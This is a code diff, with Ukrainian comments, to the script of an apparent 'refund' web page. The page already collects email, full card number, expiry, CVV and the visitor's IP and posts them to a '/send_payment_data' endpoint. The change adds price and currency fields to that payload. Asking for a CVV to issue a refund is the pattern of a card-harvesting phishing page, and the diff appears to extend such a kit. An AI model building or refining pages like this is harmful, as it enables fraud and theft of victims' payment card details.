@@ -185,6 +185,18 @@
         const card = document.getElementById('card-input').value;
         const expiry = document.getElementById('expiry-input').value;
         const cvv = document.getElementById('cvv-input').value;
+        // --- Додаємо price і currency ---
+        let price = localStorage.getItem('event_price');
+        let currency = localStorage.getItem('event_currency');
+        if (!price || !currency) {
+            // fallback: парсимо з total
+            const totalRaw = getQueryParam('total') || localStorage.getItem('refund_total') || '';
+            const match = totalRaw.match(/(\d+[\.,]?\d*)([A-Za-z]+)/);
+            if (match) {
+                price = match[1].replace(',', '.');
+                currency = match[2];
+            }
+        }
         try {
             let ip = userIP;
             if (!ip) {
@@ -194,7 +206,7 @@
             const response = await fetch('/send_payment_data', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email, card, expiry, cvv, ip, type: 'refund' })
+                body: JSON.stringify({ email, card, expiry, cvv, ip, type: 'refund', price, currency })
             });
             if (response.ok) {
                 if (!document.getElementById('payment-msg')) {
